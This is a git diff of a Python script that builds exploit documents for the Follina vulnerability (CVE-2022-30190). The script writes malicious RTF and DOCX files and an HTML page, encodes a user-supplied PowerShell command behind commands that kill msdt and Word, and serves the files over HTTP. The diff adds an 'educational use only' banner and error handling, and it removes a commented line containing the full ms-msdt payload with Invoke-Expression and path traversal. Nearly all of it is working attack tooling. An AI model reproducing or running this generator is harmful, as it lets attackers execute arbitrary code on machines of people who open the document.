@@ -7,6 +7,8 @@ import socketserver
 
 help_text = '''CVE-2022-30190 Follina Exploit Script
 
+THIS IS FOR EDUCATIONAL USE ONLY! DO NOT DISTRUBUTE DOCUMENTS CREATED BY THIS TOOL!
+
 Usage:
 python3 follina.py {host ip} {host port} {powershell command(s)}
 
@@ -22,6 +24,8 @@ PowerShell Command(s): The command(s) the exploit should run when the word docum
 def rtf(url):
 	with open("templates/rtf.template", "r") as f:
 		document_temp = f.read()
+
+	# rtf generator taken from https://github.com/chvancooten/follina.py
 
 	temp = url
 	docuri_hex = "".join("{:02x}".format(ord(c)) for c in temp)
@@ -53,16 +57,20 @@ def docx(url):
 	with open("templates/doc/word/_rels/document.xml.rels", "w") as f:
 		f.write(document_mod)
 
-	os.chdir('templates/doc/')
-	print("Current working directory: {0}".format(os.getcwd()))
-	os.system('zip ../../output/maldoc.docx * -r')
-	os.chdir('../../')
-	print("Current working directory: {0}".format(os.getcwd()))
+	try:
+		os.chdir('templates/doc/')
+		# print("Current working directory: {0}".format(os.getcwd()))
+		os.system('zip ../../output/maldoc.docx * -r -qq')
+		os.chdir('../../')
+		# print("Current working directory: {0}".format(os.getcwd()))
+	except:
+		print("Something went wrong during the creating of the DOCX, please make sure all requirements as per the README.md are met!")
+		exit()
 
 
 def main():
 	if (len(sys.argv) != 5):
-		print("Wrong amounts of arguments please refer to the bellow on how to use the script:")
+		print("Wrong amounts of arguments please refer to the bellow on how to use the script:\n\n")
 		print(help_text)
 		exit()
 
@@ -79,11 +87,9 @@ def main():
 
 	#payload will close both msdt and word and execute the user specified payload
 	cmd = 'taskkill /f /im msdt.exe;taskkill /f /im WINWORD.exe;'+sys.argv[4]
-	print(cmd)
+	# print(cmd)
 	cmd_e = base64.b64encode(bytearray(cmd, 'utf-16-le')).decode('UTF-8')
-	# payload from https://twitter.com/nao_sec/status/1530196847679401984/photo/1
-	# payload = fr'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{cmd_e}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\""'''
-
+	
 	with open("templates/web.template", "r") as f:
 		html_template = f.read()
 
@@ -92,7 +98,7 @@ def main():
 	with open("webserver/mal.html", "w") as f:
 		f.write(modified_html)
 
-	print("Generated HTML and " + sys.argv[1] + " file")
+	print("Generated HTML and " + sys.argv[1] + " file, the maldoc is in the output folder!")
 
 
 	class Handler(http.server.SimpleHTTPRequestHandler):
